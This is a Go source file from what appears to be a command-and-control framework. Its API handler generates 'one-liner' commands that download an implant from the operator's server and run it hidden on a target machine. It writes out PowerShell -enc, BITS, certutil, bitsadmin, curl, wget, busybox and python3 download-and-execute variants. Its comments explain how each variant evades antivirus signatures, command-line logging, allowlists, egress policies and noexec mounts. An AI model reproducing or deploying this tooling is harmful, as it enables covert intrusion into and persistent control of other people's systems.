package api

import (
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"path/filepath"
	"strings"

	"github.com/gorilla/mux"
	"toshell/internal/server/database"
)

// 一键上线命令（onliner）由服务端生成，前端只负责展示与复制。
//
// 关键点：命令里的下载地址必须是「目标机能访问到的地址」，而不是控制台自身的
// 访问地址。历史上这里用 window.location.origin / req.ServerURL 拼地址，运维用
// localhost:18081 打开后台时，生成的命令就变成 localhost，目标机自然下载失败。
// 现在统一走 resolveDownloadTarget 逐级回退解析（见下方注释），并在无法确定地址
// 时回传 warning，让前端显式提示运维去配置公网地址。

// OneLiner 一个「复制到目标机执行即可静默下载并运行载荷」的命令变体。
type OneLiner struct {
	// Name 变体展示名，如 "PowerShell · Base64 编码"
	Name string `json:"name"`
	// OS windows / linux
	OS string `json:"os"`
	// Shell 命令所属解释器：PowerShell / CMD / Shell
	Shell string `json:"shell"`
	// Desc 该变体的手法与适用场景（免杀思路、依赖条件）
	Desc string `json:"desc"`
	// Command 可直接复制执行的完整命令
	Command string `json:"command"`
}

// OneLinerSet 一个载荷对应的全部上线命令变体，以及下载地址解析结果。
type OneLinerSet struct {
	// Host 实际解析出的下载主机（host[:port]），用于前端提示
	Host string `json:"host"`
	// BaseURL 下载端点基址，如 https://c2.example.com
	BaseURL string `json:"base_url"`
	// Warning 非空表示地址可能不可达（回环/仅内网），需要运维确认
	Warning string `json:"warning,omitempty"`
	// Variants 命令变体，第一个为主推方案
	Variants []OneLiner `json:"variants"`
}

// supportsOneLiner 判断该 OS/格式能否用「下载后直接运行」的方式上线：
// Windows 只有 exe/raw 可直接运行；Linux 额外支持 bin（so/dll 是动态库，不能直接执行）。
func supportsOneLiner(osName, format string) bool {
	switch strings.ToLower(osName) {
	case "linux":
		return format == "exe" || format == "raw" || format == "bin"
	case "windows":
		return format == "exe" || format == "raw"
	}
	return false
}

type downloadTarget struct {
	Base    string
	Host    string
	Warning string
}

// resolveDownloadTarget 解析目标机可达的载荷下载地址，优先级从高到低：
//
//  1. override：生成载荷时显式指定（download_host）
//  2. listener.public_host：监听器配置里的公网地址（CDN/反代场景由运维填写）
//  3. 控制台自身的访问地址（X-Forwarded-Host / Host）：能打开后台即说明该地址可达，
//     反代域名会被自动识别
//  4. 载荷 server_url 的主机名（内网/公网 IP 直连场景）+ API 端口
//  5. 本机内网 IP（尽力而为，附带 warning 提示）
//  6. localhost（附带 warning，明确告知目标机无法下载）
func (s *Server) resolveDownloadTarget(r *http.Request, serverURL, override string) downloadTarget {
	scheme := "http"
	if s.cfg.Server.TLSCert != "" && s.cfg.Server.TLSKey != "" {
		scheme = "https"
	}
	apiPort := int(s.cfg.Server.APIPort)
	if apiPort == 0 {
		apiPort = 8081
	}

	if base, host, ok := normalizeDownloadBase(override, scheme, apiPort); ok {
		return downloadTarget{Base: base, Host: host}
	}
	if base, host, ok := normalizeDownloadBase(s.cfg.Listener.PublicHost, scheme, apiPort); ok {
		return downloadTarget{Base: base, Host: host}
	}
	if r != nil {
		if base, host, ok := requestDownloadBase(r); ok {
			return downloadTarget{Base: base, Host: host}
		}
	}
	if u, err := url.Parse(serverURL); err == nil && u.Hostname() != "" && !isLoopbackHost(u.Hostname()) {
		host := joinHostPort(scheme, u.Hostname(), apiPort)
		return downloadTarget{Base: scheme + "://" + host, Host: host}
	}
	if ip := detectLANIP(); ip != "" {
		host := joinHostPort(scheme, ip, apiPort)
		return downloadTarget{
			Base:    scheme + "://" + host,
			Host:    host,
			Warning: fmt.Sprintf("未配置公网地址，已自动使用本机内网地址 %s。目标机不在同一内网时请在「设置 → 监听器 → 公网地址(public_host)」填写目标机可访问的地址（如 https://c2.example.com）。", host),
		}
	}
	host := "localhost"
	return downloadTarget{
		Base:    scheme + "://" + host,
		Host:    host,
		Warning: "无法确定目标机可达的下载地址，当前回环地址 " + host + " 只能在本机生效。请在「设置 → 监听器 → 公网地址(public_host)」填写公网 IP 或反代域名（如 https://c2.example.com）。",
	}
}

// oneLinerSet 组装某个载荷的全部上线命令变体；格式不支持时返回 nil。
func (s *Server) oneLinerSet(r *http.Request, serverURL, osName, format, buildID, override string) *OneLinerSet {
	osName = strings.ToLower(strings.TrimSpace(osName))
	if osName == "" {
		osName = "windows"
	}
	if !supportsOneLiner(osName, format) {
		return nil
	}

	target := s.resolveDownloadTarget(r, serverURL, override)
	dlURL := fmt.Sprintf("%s/api/v1/implant/payload/%s", target.Base, url.PathEscape(buildID))

	return &OneLinerSet{
		Host:     target.Host,
		BaseURL:  target.Base,
		Warning:  target.Warning,
		Variants: oneLinerVariants(osName, dlURL),
	}
}

// oneLinerVariants 生成多套上线命令变体。
//
// 目的是不把鸡蛋放在一个篮子里：不同终端/AV/出口策略对 powershell -enc、LOLBin
// （certutil/bitsadmin）、系统自带 curl、BITS 服务、python 等的拦截情况各不相同，
// 现场可以换着试。每个变体都会随机化落地文件名，避免固定文件名被静态特征命中。
func oneLinerVariants(osName, dlURL string) []OneLiner {
	switch osName {
	case "linux":
		return linuxOneLiners(dlURL)
	default:
		return windowsOneLiners(dlURL)
	}
}

// windowsOneLiners Windows 上线命令变体（含 PowerShell 与 CMD/LOLBin 两类）。
func windowsOneLiners(dlURL string) []OneLiner {
	var out []OneLiner

	// 1. PowerShell -enc：Base64(UTF-16LE) 隐藏真实命令行，WebClient 静默下载 + 隐藏窗口启动。
	drop := randName(5) + ".exe"
	ps := fmt.Sprintf(`$p="$env:TEMP\%s";$w=New-Object Net.WebClient;$w.DownloadFile('%s',$p);Start-Process $p -WindowStyle Hidden`, drop, dlURL)
	out = append(out, OneLiner{
		Name: "PowerShell · Base64 编码", OS: "windows", Shell: "PowerShell",
		Desc:    "powershell -enc 编码后命令行不出现下载地址与落地路径，WebClient 静默下载并以隐藏窗口启动。通用性最好，作为首选。",
		Command: "powershell -w hidden -nop -enc " + encodeUTF16LE(ps),
	})

	// 2. BITS 传输：下载由 BITS 服务（svchost）发起，不经过命令行进程出网。
	drop = randName(5) + ".exe"
	ps = fmt.Sprintf(`$p="$env:TEMP\%s";Import-Module BitsTransfer;$j=Start-BitsTransfer -Source '%s' -Destination $p -Asynchronous;while($j.JobState -eq 'Transferring'){Start-Sleep -Milliseconds 300};Complete-BitsTransfer $j;Start-Process $p -WindowStyle Hidden`, drop, dlURL)
	out = append(out, OneLiner{
		Name: "PowerShell · BITS 传输", OS: "windows", Shell: "PowerShell",
		Desc:    "经 BITS 服务下载，出网进程是 svchost 而非脚本宿主；可绕过只放行浏览器/系统更新出网的主机策略。",
		Command: "powershell -w hidden -nop -enc " + encodeUTF16LE(ps),
	})

	// 3. HttpClient：去掉 Net.WebClient / DownloadFile 明文特征。
	drop = randName(5) + ".exe"
	ps = fmt.Sprintf(`$p="$env:TEMP\%s";$h=New-Object Net.Http.HttpClient;$h.Timeout=[TimeSpan]::FromSeconds(30);$b=$h.GetByteArrayAsync('%s').Result;[IO.File]::WriteAllBytes($p,$b);Start-Process $p -WindowStyle Hidden`, drop, dlURL)
	out = append(out, OneLiner{
		Name: "PowerShell · HttpClient 无 WebClient 特征", OS: "windows", Shell: "PowerShell",
		Desc:    "使用 .NET HttpClient 字节流写盘，替换常见规则里 WebClient+DownloadFile 的组合特征；行为与首选方案一致。",
		Command: "powershell -w hidden -nop -enc " + encodeUTF16LE(ps),
	})

	// 4. certutil：Windows 自带签名工具，常被白名单放过。
	drop = randName(5) + ".exe"
	out = append(out, OneLiner{
		Name: "CMD · certutil (LOLBin)", OS: "windows", Shell: "CMD",
		Desc:    "系统自带签名工具下载，白名单/应用控制策略常放过；会在 Crypto 缓存留下记录，适合短平快场景。",
		Command: fmt.Sprintf(`certutil -urlcache -split -f "%s" "%%TEMP%%\%s" && start "" /b "%%TEMP%%\%s"`, dlURL, drop, drop),
	})

	// 5. bitsadmin：老牌 BITS 命令行工具，同样借助系统服务出网（Win7 起全版本可用）。
	drop = randName(5) + ".exe"
	out = append(out, OneLiner{
		Name: "CMD · bitsadmin (LOLBin)", OS: "windows", Shell: "CMD",
		Desc:    "借助 BITS 服务的命令行下载，兼容性覆盖老系统；部分环境已弃用该工具，失败时换 BITS 的 PowerShell 变体。",
		Command: fmt.Sprintf(`bitsadmin /transfer toshell /download /priority normal "%s" "%%TEMP%%\%s" >nul & start "" /b "%%TEMP%%\%s"`, dlURL, drop, drop),
	})

	// 6. curl.exe：Win10 1803+ 自带，命令行短、不依赖 PowerShell 执行策略。
	drop = randName(5) + ".exe"
	out = append(out, OneLiner{
		Name: "CMD · curl.exe", OS: "windows", Shell: "CMD",
		Desc:    "系统自带 curl（Win10 1803+/Server 2019+），不触发 PowerShell 执行策略与脚本日志；老系统无 curl.exe 时改用 certutil 变体。",
		Command: fmt.Sprintf(`curl.exe -fsSL "%s" -o "%%TEMP%%\%s" && start "" /b "%%TEMP%%\%s"`, dlURL, drop, drop),
	})

	return out
}

// linuxOneLiners Linux 上线命令变体：覆盖有无 curl/wget、精简系统（busybox）、
// 以及 /tmp 被挂载为 noexec 的加固主机。
func linuxOneLiners(dlURL string) []OneLiner {
	var out []OneLiner

	// 1. curl 优先、wget 兜底：一条命令覆盖绝大多数发行版。
	drop := fmt.Sprintf("/tmp/.%s", randName(5))
	out = append(out, OneLiner{
		Name: "Shell · curl / wget 兜底", OS: "linux", Shell: "Shell",
		Desc:    "curl 失败自动回退 wget，落地到 /tmp 隐藏文件名后放行并脱离终端运行；通用性最好，作为首选。",
		Command: fmt.Sprintf(`curl -fsSL '%s' -o %s 2>/dev/null || wget -qO %s '%s'; chmod +x %s; nohup %s >/dev/null 2>&1 &`, dlURL, drop, drop, dlURL, drop, drop),
	})

	// 2. wget 单工具版：部分加固主机卸载了 curl。
	drop = fmt.Sprintf("/tmp/.%s", randName(5))
	out = append(out, OneLiner{
		Name: "Shell · wget", OS: "linux", Shell: "Shell",
		Desc:    "仅依赖 wget（部分加固镜像会卸载 curl），下载成功后后台运行。",
		Command: fmt.Sprintf(`wget -qO %s '%s' && chmod +x %s && nohup %s >/dev/null 2>&1 &`, drop, dlURL, drop, drop),
	})

	// 3. busybox wget：路由器/OpenWrt/容器精简镜像常见。
	drop = fmt.Sprintf("/tmp/.%s", randName(5))
	out = append(out, OneLiner{
		Name: "Shell · busybox wget", OS: "linux", Shell: "Shell",
		Desc:    "路由、IoT、精简容器镜像里常见的 busybox 环境；setsid 让进程脱离当前会话，避免退出终端被回收。",
		Command: fmt.Sprintf(`busybox wget -q -O %s '%s' 2>/dev/null; chmod +x %s; setsid %s >/dev/null 2>&1 &`, drop, dlURL, drop, drop),
	})

	// 4. python3：无 curl/wget 但有 python 的镜像。
	drop = fmt.Sprintf("/tmp/.%s", randName(5))
	out = append(out, OneLiner{
		Name: "Shell · python3", OS: "linux", Shell: "Shell",
		Desc:    "纯 Python 标准库下载（urllib），不依赖任何外部下载工具；常用于只装了 python3 的容器与跳板机。",
		Command: fmt.Sprintf(`python3 -c "import urllib.request as u,os;p='%s';u.urlretrieve('%s',p);os.chmod(p,0o755);os.system('setsid '+p+' >/dev/null 2>&1 &')"`, drop, dlURL),
	})

	// 5. 落地到用户缓存目录：绕过 /tmp 被挂载为 noexec 的加固策略。
	drop = fmt.Sprintf("$HOME/.cache/.%s", randName(5))
	out = append(out, OneLiner{
		Name: "Shell · 落地用户目录（规避 /tmp noexec）", OS: "linux", Shell: "Shell",
		Desc:    "很多加固基线把 /tmp 挂载为 noexec，导致下载成功却无法执行；此变体改落地到家目录缓存目录。",
		Command: fmt.Sprintf(`d="${HOME:-/tmp}/.cache";mkdir -p "$d";p="%s";curl -fsSL '%s' -o "$p" 2>/dev/null || wget -qO "$p" '%s';chmod +x "$p";setsid "$p" >/dev/null 2>&1 &`, drop, dlURL, dlURL),
	})

	// 6. setsid + 重定向到 /dev/null：完全脱离终端与会话，适合 ssh 一次性执行。
	drop = fmt.Sprintf("/tmp/.%s", randName(5))
	out = append(out, OneLiner{
		Name: "Shell · setsid 完全脱离终端", OS: "linux", Shell: "Shell",
		Desc:    "setsid 建立独立会话，父进程退出后植入体不会被 SIGHUP 回收，适合 ssh 执行完立即断开。",
		Command: fmt.Sprintf(`setsid sh -c "curl -fsSL '%s' -o %s 2>/dev/null || wget -qO %s '%s'; chmod +x %s; exec %s" >/dev/null 2>&1 &`, dlURL, drop, drop, dlURL, drop, drop),
	})

	return out
}

// storedImplantOneLinerHandler GET /api/v1/implants/stored/{id}/oneliner
// 为已构建的载荷重新生成上线命令（列表页「一条命令上线」入口），
// 地址解析与生成时一致，避免前端用自己的访问地址拼出 localhost。
func (s *Server) storedImplantOneLinerHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	id := mux.Vars(r)["id"]
	osName, format := "windows", ""

	if strings.HasPrefix(id, "file:") {
		// 输出目录里没有数据库记录的遗留文件：按扩展名推断平台与格式。
		name := strings.TrimPrefix(id, "file:")
		format = strings.TrimPrefix(filepath.Ext(name), ".")
		if format == "so" || format == "bin" {
			osName = "linux"
		}
	} else if db := database.Get(); db != nil {
		if imp, err := db.GetImplant(id); err == nil {
			osName, format = imp.OS, imp.Format
		}
	}

	set := s.oneLinerSet(r, "", osName, format, id, "")
	if set == nil {
		w.WriteHeader(http.StatusOK)
		_ = json.NewEncoder(w).Encode(map[string]interface{}{
			"variants": []OneLiner{},
			"error":    "该格式的载荷不支持一条命令上线（仅支持可直接运行的 exe/raw，Linux 额外支持 bin）",
		})
		return
	}

	_ = json.NewEncoder(w).Encode(set)
}

// ---- 地址解析工具 ----

// normalizeDownloadBase 解析运维填写的下载基址，允许三种写法：
//
//	https://c2.example.com          → 原样使用（含路径前缀，适合 CDN/反代子路径）
//	c2.example.com:18081            → 按当前协议拼 scheme://host:port
//	c2.example.com                  → 省略端口（协议为 https 时按 443 处理）
//
// 空值、回环地址（localhost/127.0.0.1/::1）一律视为无效，交由下一级回退。
func normalizeDownloadBase(raw, fallbackScheme string, apiPort int) (string, string, bool) {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return "", "", false
	}

	if strings.Contains(raw, "://") {
		u, err := url.Parse(raw)
		if err != nil || u.Host == "" || isLoopbackHost(u.Hostname()) {
			return "", "", false
		}
		path := strings.TrimSuffix(strings.TrimSpace(u.Path), "/")
		return u.Scheme + "://" + u.Host + path, u.Host, true
	}

	hostPart, path := raw, ""
	if i := strings.IndexByte(raw, '/'); i >= 0 {
		hostPart, path = raw[:i], strings.TrimSuffix(raw[i:], "/")
	}
	h, port := splitHostPortLoose(hostPart)
	if h == "" || isLoopbackHost(h) {
		return "", "", false
	}
	if port == "" && !defaultPort(fallbackScheme, apiPort) {
		hostPart = fmt.Sprintf("%s:%d", h, apiPort)
	}
	return fallbackScheme + "://" + hostPart + path, hostPart, true
}

// requestDownloadBase 用控制台自身的访问地址作为下载基址。
// 能打开后台就说明这个地址对运维可达；反代域名会被 X-Forwarded-* 自动识别。
func requestDownloadBase(r *http.Request) (string, string, bool) {
	host := firstCSV(r.Header.Get("X-Forwarded-Host"))
	if host == "" {
		host = r.Host
	}
	if host == "" {
		return "", "", false
	}
	scheme := strings.ToLower(firstCSV(r.Header.Get("X-Forwarded-Proto")))
	if scheme != "http" && scheme != "https" {
		scheme = "http"
		if r.TLS != nil {
			scheme = "https"
		}
	}
	h, _ := splitHostPortLoose(host)
	if isLoopbackHost(h) {
		return "", "", false
	}
	return scheme + "://" + host, host, true
}

// isLoopbackHost 判断是否回环/未指定地址：这类地址写进上线命令对目标机毫无意义。
func isLoopbackHost(host string) bool {
	host = strings.ToLower(strings.TrimSpace(strings.Trim(host, "[]")))
	if host == "" {
		return true
	}
	switch host {
	case "localhost", "localhost.localdomain", "0.0.0.0", "::", "::1":
		return true
	}
	if ip := net.ParseIP(host); ip != nil {
		return ip.IsLoopback() || ip.IsUnspecified()
	}
	return false
}

// detectLANIP 尽力探测本机内网 IPv4（优先私有网段），用于未配置公网地址时兜底。
func detectLANIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return ""
	}
	var fallback string
	for _, addr := range addrs {
		ipnet, ok := addr.(*net.IPNet)
		if !ok {
			continue
		}
		ip := ipnet.IP.To4()
		if ip == nil || ip.IsLoopback() || ip.IsUnspecified() || !ip.IsGlobalUnicast() {
			continue
		}
		if ip.IsPrivate() {
			return ip.String()
		}
		if fallback == "" {
			fallback = ip.String()
		}
	}
	return fallback
}

// splitHostPortLoose 宽松拆分 host[:port]，无端口时返回空 port。
func splitHostPortLoose(raw string) (string, string) {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return "", ""
	}
	if h, p, err := net.SplitHostPort(raw); err == nil {
		return h, p
	}
	return raw, ""
}

// joinHostPort 拼接 host:port，默认端口（http 80 / https 443）省略。
func joinHostPort(scheme, host string, port int) string {
	if port <= 0 || defaultPort(scheme, port) {
		return host
	}
	return fmt.Sprintf("%s:%d", host, port)
}

// defaultPort 判断端口是否是该协议的默认端口（可省略）。
func defaultPort(scheme string, port int) bool {
	return (scheme == "https" && port == 443) || (scheme == "http" && port == 80)
}

// firstCSV 取逗号分隔头的第一个值（反代常追加多级 X-Forwarded-*）。
func firstCSV(v string) string {
	if i := strings.IndexByte(v, ','); i >= 0 {
		v = v[:i]
	}
	return strings.TrimSpace(v)
}
